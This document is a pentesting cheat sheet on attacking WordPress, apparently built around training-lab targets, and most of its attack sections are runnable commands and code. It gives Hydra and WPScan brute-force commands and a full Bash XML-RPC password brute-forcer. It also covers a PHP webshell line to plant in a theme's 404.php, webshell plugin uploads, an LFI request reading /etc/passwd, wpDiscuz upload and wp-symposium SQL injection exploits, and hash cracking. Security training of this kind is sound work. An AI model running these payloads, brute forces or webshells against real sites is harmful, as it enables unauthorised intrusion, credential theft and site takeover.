# Wordpress

&#x20;[https://github.com/m4ll0k/WPSeku](https://github.com/m4ll0k/WPSeku)

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress)

## Discovery & Enumeration
### Discovery/Footprinting
```sh
curl $IP/robots.txt
/wp-admin
/wp-content
/wp-login.php
# Enum vulnerable plugins
/wp-content/plugins
# Enum themes
/wp-content/themes

# Important WordPress users
- Administrator: This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
- Editor: An editor can publish and manage posts, including the posts of other users.
- Author: They can publish and manage their own posts.
# Editors and authors might have access to certain vulnerable plugins, which normal users don’t.
```
### Enumeration
```sh
# LOOK AT THE SOURCE CODE
curl -s http://blog.inlanefreight.local | grep WordPress
curl -s http://blog.inlanefreight.local/ | grep themes
curl -s http://blog.inlanefreight.local/ | grep plugins
curl -s http://blog.inlanefreight.local/?p=1 | grep plugins
# SEARCH VERSIONS, SEE IF THEY ARE VULNERABLE AND NOTE THEM DOWN FOR LATER; DO NOT QUICKLY EXPLOIT THE FIRST THING YOU FIND
```
### Enumerating Users
Go to `wp-login.php` and enter a user and any password. The error if a user exists or not is different.
### WPScan
```sh
https://github.com/wpscanteam/wpscan
sudo gem install wpscan
# https://wpvulndb.com which is used by WPScan to scan for PoC and reports -> OBTAIN API TOKEN
--api-token parameter

# Normal enumeration with API token
wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
# NOTE WP VERSION, PLUGINS, THEMES, USERS, DIRECTORY LISTING ENABLED, XML-RPC ENABLED TO PERFORM BRUTE-FORCING
```
## Attacking
We need administrator-level credentials.
```sh
############# LOGIN BRUTEFORCE
# 2 ways: wp-login to bf the standard login page and xmlrpc to make attemps on /xmlrpc.php (preferred because it is faster)
wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

############# CODE EXECUTION
# Appearance > Theme Editor > choose an inactive theme to avoid corrupting the primary theme > Select theme > edit 404.php to add a webshell
system($_GET[0]);
# Add that single line at the beginning below the comments to avoid too much modification of the contents.
# Click on Update File at the bottom to save > go to `/wp-content/themes/<theme name>` to find the file
curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id
# Alternative with Metasploit https://www.rapid7.com/db/modules/exploit/unix/webapp/wp_admin_shell_upload/ > set RHOSTS and in this case also VHOST as well as USERNAME/PASSWORD
msf> use exploit/unix/webapp/wp_admin_shell_upload 
```
### Leveraging Known Vulnerabilities
Note: We can use the [waybackurls](https://github.com/tomnomnom/waybackurls) tool to look for older versions of a target site using the Wayback Machine. Sometimes we may find a previous version of a WordPress site using a plugin that has a known vulnerability. If the plugin is no longer in use but the developers did not remove it properly, we may still be able to access the directory it is stored in and exploit a flaw.
#### Vulnerable Plugins - mail-masta
```sh
https://www.exploit-db.com/exploits/41438
https://www.exploit-db.com/exploits/50226

curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd
```
#### Vulnerable plugins - wpDiscuz
```sh
https://www.exploit-db.com/exploits/49967
https://www.wordfence.com/blog/2020/07/critical-arbitrary-file-upload-vulnerability-patched-in-wpdiscuz-plugin/

python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1
# If exploit fails do not worry, file could have been uploaded anyway
curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
```

## Basic info

**Uploaded** files go to: _`http://10.10.10.10/wp-content/uploads/2018/08/a.txt`_\
**Themes files can be found in /wp-content/themes/,** so if you change some php of the theme to get RCE you probably will use that path. For example: Using **theme twentytwelve** you can **access** the **404.php** file i&#x6E;**: /wp-content/themes/twentytwelve/404.php**\
**Another useful url could be: /wp-content/themes/default/404.php**

**In wp-config.php you can find the root password of the database.**

Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

???+ tip
    In case of problems to reach URL try this parameter on wpscan:
    
    ```
    --disable-tls-checks
    ```

## Enumerate users

Wordpress login page always says if the username does exist or not. So first is to use a dictionary and guess the username with Hydra. Intercept the request with Burp Suite to inform correctly about the parameters to Hydra. Another option is to bruteforce the **authorid**.


```bash
# To find usernames manually
http://$url/?author=userid
# We will get this kind of response as URL
http://url/author/nickname/

# ----If bruteforce is used, try /usr/share/seclists/Usernames/Names/names.txt
# Burp interception
/wp-login.php
log=admin&pwd=1&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.195.175%2Fwp-admin%2F&testcookie=1
# And this information combined into Hydra:
hydra -L users.txt -p '1' -f 10.10.195.175 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.195.175%2Fwp-admin%2F&testcookie=1:Invalid username"

# WPSCAN
wpscan --url $URL[/$PATH] --enumerate u
```


After guessing the username, we can use Hydra again and guess the password with the dictionary.

???+ tip
    We may have to change the failed identification request from "Invalid username" to "The password you entered" most likely.

## Bruteforce login panel


```bash
# HYDRA
hydra -l admin -p passwords.txt -f 10.10.195.175 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In&redirect_to=http%3A%2F%2F10.10.195.175%2Fwp-admin%2F&testcookie=1:The password you entered for the username"

# WPSCAN - BRUTE FORCE WITH A USER(S) WE GOT PREVIOUSLY
wpscan --url $URL[/$PATH] -U $USER(S) -P $WORDLIST --max-threads 50
```


## Change password (MySQL)


```sql
MariaDB [wordpress_db]> UPDATE wp_users SET user_pass = MD5('hola') WHERE ID=1 LIMIT 1;
```


## Enumerate plugins


```bash
# First check if /wp-content/plugins/ have directory listing enabled
# Another way
curl -s -X GET http://web.com/wordpress | grep plugin

# NMAP
https://nmap.org/nsedoc/scripts/http-wordpress-enum.html

# MANUAL ENUMERATION  WITH WFUZZ WITH A WORDPRESS VULNERABLE PLUGINS LIST 
https://raw.githubusercontent.com/RandomRobbieBF/wordpress-plugin-list/main/wp-plugins.lst
https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/CMS/wordpress.fuzz.txt
ffuf -c -r -u -w dict http://$URL/wpFUZZ

# WPSCAN
# ap (all plugins), all themes (at), config backups (cb), Db exports (dbe)
wpscan --url sandbox.local --enumerate ap,at,cb,dbe
wpscan --url sandbox.local --enumerate u,ap --force --plugins-detection mixed
# vulnerable plugins, themes, users viral timthumb vuln, config back, db exp
wpscan --url http:// -e vt,tt,u,vp,cb,dbe
# ENUMERATE VULNERABLE PLUGINS (SOMETIMES MAY FAIL, TRY ALSO TO ENUM ALL)
wpscan -e vp #just vulnerable plugins
wpscan --enumerate p/ap --plugins-detection aggressive #popular/all aggressive way
```


???+ tip
    Apart from fuzzing, check manually files under /wp-content/plugins/ in case the resource is listable as some plugins might not be in the wordlist.

## Panel RCE

Once we sucessfully logged in > **Appearance → Theme editor → 404 Template** (at the right)

Change the content for a php shell:

![](<../../assets/image (33).png>)

Now log out and go to `http(s)://$IP/$wordpress_path/?p=404.php`

???+ tip
    If the files are not writable (404.php on Templates) --> search for others .php files there.

## Install/Upload plugin

If we can upload new plugins, open a Netcat connection, use a reverse shell and zip it before uploading it.


```bash
https://github.com/leonjza/wordpress-shell
https://github.com/p0dalirius/Wordpress-webshell-plugin

#### BEST WAY
1. Go to plugins > Add New > Upload Plugin 
2. Upload .php plugin there (from /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php)
3. We see an error message - the package could not be installed, does not matter
4. The shell is ready at http://$IP/wp-content/uploads/$YEAR/$MONTH/plugin-shell.php?cmd=id 

# Go to Plugins > Add Plugins
# Use the following PHP plugin:
We take /usr/share/seclists/Web-Shells/WordPress/plugin-shell.php
# Zip it and upload it, then it will be at /wp-content/plugins/shell/shell.php
http://$IP/wp-content/plugins/shell/shell.php?cmd=id
```


## Main Wordpress files

[https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#main-wordpress-files](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/wordpress#main-wordpress-files)

## Abusing xmlrpc.php

[https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/](https://nitesculucian.github.io/2019/07/01/exploiting-the-xmlrpc-php-on-all-wordpress-versions/)


```bash
#!/bin/bash

# Colores
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

function ctrl_c(){
  echo -e "\n\n${redColour}[!] Saliendo...${endColour}\n"
  rm data.xml 2>/dev/null
  tput cnorm; exit 1
}

# Ctrl+C
trap ctrl_c SIGINT

function helpPanel(){
  echo -e "\n${yellowColour}[+]${grayColour} Uso:${blueColour} $0${turquoiseColour} -u${redColour} usuario${turquoiseColour} -w${redColour} wordlist_path${endColour}\n"
  echo -e "\t${purpleColour}-u)${grayColour} Usuario a probar${endColour}"
  echo -e "\t${purpleColour}-w)${grayColour} Ruta del diccionario a probar${endColour}"
  tput cnorm; exit 1
}

declare -i parameter_counter=0

tput civis

while getopts "u:w:h" arg; do
  case $arg in
    u) username=$OPTARG && let parameter_counter+=1;; 
    w) wordlist=$OPTARG && let parameter_counter+=1;;
    h) helpPanel
  esac
done

function makeXML(){
  username=$1
  wordlist=$2

  cat $wordlist | while read password; do
    xmlFile="""
<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<methodCall> 
<methodName>wp.getUsersBlogs</methodName> 
<params> 
<param><value>loly</value></param> 
<param><value>$password</value></param> 
</params> 
</methodCall>
"""

  echo $xmlFile > data.xml

  response=$(curl -s -X POST "http://loly.lc/wordpress/xmlrpc.php" -d@data.xml)

  if [ ! "$(echo $response | grep -E 'Incorrect username or password.|parse error. not well formed')" ]; then
    echo -e "\n${yellowColour}[+] ${grayColour}La contraseña es ${blueColour}$password${endColour}"
    rm data.xml 2>/dev/null
    tput cnorm && exit 0
  fi
  done
}

if [ $parameter_counter -eq 2 ]; then
  if [ -f $wordlist ]; then
    makeXML $username $wordlist
  else
    echo -e "\n\n${redColour}[!] El archivo no existe${endColour}\n"
  fi
else
  helpPanel
fi

rm data.xml 2>/dev/null
tput cnorm
```


## SQLi


```sql
select user_login,user_pass from wp_users

https://sudonull.com/post/7030-50-shades-of-token
└─$ wget "http://192.168.69.23/wordpress/wp-content/plugins/wp-symposium-15.1/get_album_item.php?size=version() ; --" -O output.txt                                    

wget -q -O- 192.168.102.10/wp-content/plugins/wp-symposium-15.1/get_album_item.php?size=* from token; --"

#!/bin/bash
for  ((i=0;  i<= 10; i++))
do
wget --no-proxy  -q -O-  "http://192.168.102.10/wp-content/plugins/wp-symposium-15.1/get_album_item.php?size=SCHEMA_NAME  FROM INFORMATION_SCHEMA.SCHEMATA limit 1 offset $i; --"echo""done
```


## Crack hashes

```sh
$P$984478476IagS59wHZvyQMArzfx58u.
hashcat -m 400 hashes rockyou.txt
```

## Metasploit

`wp_admin_shell_upload` module

## XSS admin user

[https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/](https://shift8web.ca/2018/01/craft-xss-payload-create-admin-user-in-wordpress-user/)

## General note about CMS
Do not try only to upload shell.php but a folder with shell.php inside (it is the understanding of a plugin, a directory with files).